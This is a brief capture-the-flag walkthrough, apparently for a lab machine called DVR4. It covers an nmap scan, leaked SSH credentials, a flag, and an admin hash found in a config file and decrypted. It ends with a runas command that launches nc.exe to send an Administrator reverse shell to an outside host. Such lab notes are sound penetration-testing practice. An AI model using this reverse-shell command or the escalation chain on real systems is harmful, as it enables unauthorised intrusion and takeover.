# Nmap

```
sudo nmap -sC -sV 192.168.224.179 -oN nmap-dvr4
```

# Initial Access Creds

```
viewer / ImWatchingY0u
```

## SSH in for Initial Access
```
ssh viewer@192.168.224.179 
```

Flag
```
20b79f1f80cc9a021c89248bf49a8c4d
```


Look for hidden files in C:/

```
dir /a
```

Discover ProgramData and an .ini config file with admin hash. 

Use this searchsploit decryptor to decrypt admin hash.
![[PG/Windows/attachments/Pasted image 20250701200258.png]]

Then set up nc listener on 443.

And use `run as` and nc.exe to authenticate as an admin and get the admin user shell.

```
runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe 192.168.45.152 443"
```
![[PG/Windows/attachments/Pasted image 20250701205939.png]]

Catch shell from nc runas cmd
![[PG/Windows/attachments/Pasted image 20250701210121.png]]
